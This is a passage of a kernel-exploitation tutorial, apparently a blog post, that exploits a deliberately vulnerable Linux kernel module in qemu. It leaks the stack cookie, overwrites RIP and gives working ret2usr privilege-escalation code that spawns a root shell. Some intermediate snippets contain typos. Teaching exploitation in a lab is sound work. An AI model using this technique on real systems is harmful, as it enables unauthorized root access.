+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Open Error: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">FILE</span><span class="p">);</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&#34;leak[%d]: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div>
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >The <code>C</code> script above will be compiled as a statically-linked binary locally and added to the rootfs filesystem.</span>
+</div>
+
+<p>Compile the above C code using the following GCC command</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gcc -o chall chall.c -static
+</span></span></code></pre></div><p>Copy this file into the <code>rootfs</code> directory and re-archive the new file system to <em>cpio.gz</em>. This process will be repeated multiple times but as <code>ChatGPT</code> says: <em>&ldquo;A task repeated multiple times may be automated by scripting once.&rdquo;</em></p>
+<p>The bash-script <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts/blob/main/bash.sh"   target="_blank">
+    here</a> will be used to automate the task of compiling the above <code>C</code> code, copying it into the rootfs, archiving this filesystem and finally running <code>qemu</code>.</p>
+<p>When the emulator is restarted the compiled <code>chall</code> binary is now in the file system. Before running it, we need to attach a debugger and set the previous break-point before the <em>copy_to_user</em> function. Continue execution and now running <code>chall</code> will hit the breakpoint. At this point we expect the stack-cookie right after the buffer to be leaked since the <code>C</code> script reads 40 bytes <code>Out-Of-Bounds</code> compared to the 24 bytes allocated for the buffer on the stack.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/KRepBDr.png" alt="leak" />
+    
+  </figure>
+
+</p>
+<p>This leak will be essential in bypassing the implement stack-cookie.</p>
+<div id="stack-buffer-overflow" class="anchor"></div>
+<h2 class="relative group">Stack Buffer Overflow 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#stack-buffer-overflow" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>Now to the real deal, the <em>vuln_write()</em> function defined in the loadable module is vulnerable to a stack-buffer overflow when more that <code>0x20</code> are written to the device driver interface <code>/dev/vuln</code>. Modify the above <code>C</code> script as follows to write <code>0x28</code> bytes on the stack and also return the leaked stack-cookie.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define FILE &#34;/dev/vuln&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">long</span> <span class="n">stack_cookie</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">overflow_size</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">[</span><span class="n">size</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">FILE</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Open Error: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">FILE</span><span class="p">);</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">stack_cookie</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="n">leak</span><span class="p">[</span><span class="mh">0x3</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&#34;[+] StackCookie: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">stack_cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint64_t</span> <span class="n">overflow</span><span class="p">[</span><span class="n">overflow_size</span><span class="p">];</span> <span class="c1">//8 * 8 == 64 bytez
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="n">overflow_size</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">overflow</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">overflow</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&#34;[+] Wrote %d bytez</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">w</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></div><p>Compile and launch the emulator using <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts/blob/main/bash.sh"   target="_blank">
+    this</a> bash script introduced above. From the emulator, we need to return the address of <em>vuln_write()</em> using the following command.</p>
+<pre tabindex="0"><code>cat /proc/kallsyms | grep -i vuln_write
+</code></pre><p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/lUpSQUl.png" alt="vuln_write" />
+    
+  </figure>
+
+</p>
+<p>Attach the debugger to disassemble the <em>vuln_write</em> function and set a break-point write after the call to <em>memcpy()</em> whose address is marked as shown below.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/wJpVnTu.png" alt="vuln_write diass" />
+    
+  </figure>
+
+</p>
+<pre tabindex="0"><code>(gdb) br *0xffffffffc000011f
+</code></pre><p>The above will set a break-point right after the vulnerable <em>memcpy()</em>, continue execution and from the emulator run <code>./chall</code>. This should hit the break-point on the debugger and the stack can now be examined.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/6ObXBgd.png" alt="vuln_write_stack" />
+    
+  </figure>
+
+</p>
+<p>As shown above, the stack-cookie is overwritten and when execution is continued, the Kernel Panics with a <code>Kernel Stack is Corrupted</code> error.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/jUpRWGj.png" alt="stack_cookie" />
+    
+  </figure>
+
+</p>
+<p>The value that overwrote the stack-cookie was at index <code>0x4</code> in the <em>overflow</em> array. Edit the code above with the value of the stack_cookie leaked earlier to bypass the stack-cookie check. The overflow buffer will also be filled with junk values that will help up determine the offset of the return address when the Kernel crashes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">overflow</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">overflow</span><span class="p">[</span><span class="mh">0x5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4242424242424242</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">overflow</span><span class="p">[</span><span class="mh">0x6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4343434343434343</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">overflow</span><span class="p">[</span><span class="mh">0x7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3030303030303030</span><span class="p">;</span>
+</span></span></code></pre></div><p>Re-Compile the code and start <code>qemu</code>, running <code>chall</code> triggers a Kernel Panic and returns the registers values. As shown below, we can see that we successfuly overwrote <code>RIP</code> and its offset is <code>overflow[0x6]</code>.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/OG2kvsm.png" alt="rip_overwrite" />
+    
+  </figure>
+
+</p>
+<p>With the offset to <code>RIP</code> and the stack-cookie we can now plan an attack to get a shell. If this was the exploitation of a UserSpace application we could have just returned to libc, or jump to shellcode on the stack. In the Kernel, there is not need for a shell; the aim is to return to userLand and gain a shell as a high privillege user i.e <code>root</code>.</p>
+<div id="exploitation" class="anchor"></div>
+<h2 class="relative group">Exploitation 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>The exploitation of Kernel Stack Overflow depends on the mitigations implemented. In this case, not many mitigations are implemented we can therefore craft an attack to return back to the userland using the <code>ret2usr()</code> attack.</p>
+<p>This is an attack that leverages the fact that userspace processes cannot access kernel space, but the Kernel can access user space to execute user space code. The code for privilege escalation will therefore be defined in the user-space, this code should call <em>commit_creds</em> and the <em>prepare_kernel_cred</em>, that reside in the Kernel in the format.</p>
+<pre tabindex="0"><code>commit_creds(prepare_kernel_cred(0))
+</code></pre><p>Why are the above functions called?</p>
+<p>When we interact with the Kernel, for example via a syscall; each of these processes are represented in the Kernel in  a <code>struct task_struct</code> structure that is doubly-linked. The <code>task_struct</code> contains a member the <code>struct creds</code> that is used by the Kernel to determine if a specific process is allowed to do something for example execute a specific syscall. The aim of calling the above functions, is therefore to update/modify the creds structure to gain more permissions.</p>
+<p>When the <code>prepare_kernel_cred</code> function is called, it creates a new <code>cred struct</code> and more specifically when <code>0</code> is passed as the argument it sets the values like <code>UID/GID</code> to zero, therefore giving us a more higher privilege.</p>
+<pre tabindex="0"><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)
+</code></pre><p>The <em>commit_creds()</em> function on the other hand, installs a new <code>struct creds</code> for the current process. Therefore calling this functions together will have modified the current process&rsquo;s privileges.</p>
+<p>Since <code>KASLR</code> is disabled, the address of these functions can be obtained from <code>/proc/kallsyms</code>.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/hevazr2.png" alt="" />
+    
+  </figure>
+
+</p>
+<p>This code will therefore defined in the UserSpace in a function called <code>update_creds</code> as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update_creds</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;movabs rax, 0xffffffff810894f0;&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;xor rdi, rdi;&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;call rax;&#34;</span> 
+</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span><span class="p">;</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;movabs rax, 0xffffffff810892c0;&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;call rax;&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">....</span>
+</span></span><span class="line"><span class="cl"><span class="n">overflow</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">overflow</span><span class="p">[</span><span class="mh">0x5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span> <span class="c1">//JUNK
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">overflow</span><span class="p">[</span><span class="mh">0x6</span><span class="p">]</span> <span class="o">=</span> <span class="n">update_creds</span><span class="p">;</span>
+</span></span></code></pre></div><p>The above exploit script code can now be compiled using the following <code>GCC</code> command.</p>
+<pre tabindex="0"><code>gcc -o chall challc -masm=intel -static
+</code></pre><div id="return-to-userland" class="anchor"></div>
+<h4 class="relative group">Return-to-UserLand 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#return-to-userland" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>After changing our privileges, we now have to find a way to return to userland and pop a shell. When the Kernel returns to UserLand it uses the following instructions <code>iretq</code> and <code>sysretq</code>.</p>
+<p>In this post, we will be using the <code>iretq</code> instruction. This instruction will require some registers which should be set-up on the stack in the following order.</p>
+<pre tabindex="0"><code>RIP - Next Instruction
+CS - Code Segment Register
+eFLAGS - eFlag Registers
+SP - Stack Pointer Register
+SS - Stack Segment Register
+</code></pre><p>The <code>RIP</code> register can finally be set to the address of a function that will pop a shell. The state of the other registers can be saved before exploitation and pushed on the stack after <code>iretq</code>.</p>
+<p>First saving the code to save the registers will be declared in the <code>save_registers</code> function with the following code.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">,</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_rip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save_registers</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov user_ss, ss;&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov user_cs, cs;&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov user_sp, rsp;&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;pushf;&#34;</span> <span class="c1">//push all flag registers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s">&#34;pop user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Finally, the function whose address will be stored in the <code>rip</code> register will be as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">getgid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Failed to privz!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The final exploit code for a full <code>ret2usr</code> attack is as shown below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define FILE &#34;/dev/vuln&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">long</span> <span class="n">stack_cookie</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">,</span> <span class="n">user_cs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] Returned to UserLandz&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">getgid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Failed to Privz&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save_registers</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;mov user_cs, cs;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;mov user_ss, ss;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;mov user_sp, rsp;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;pushf;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;pop user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&#34;[+] Saved Registers!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update_creds</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">get_shell</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;movabs rax, 0xffffffff810894f0;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;xor rdi, rdi;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;movabs rax, 0xffffffff810892c0;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;call rax;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;swapgs;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;mov r9, user_ss;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;push r9;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;mov r9, user_sp;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;push r9;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;mov r9, user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;push r9;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;mov r9, user_cs;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;push r9;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;mov r9, user_rip;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;push r9;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;iretq;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">overflow_size</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">[</span><span class="n">size</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">save_registers</span><span class="p">();</span> <span class="c1">//save the users-space registers before diving into thre Kernel;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">FILE</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Open Error: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">FILE</span><span class="p">);</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
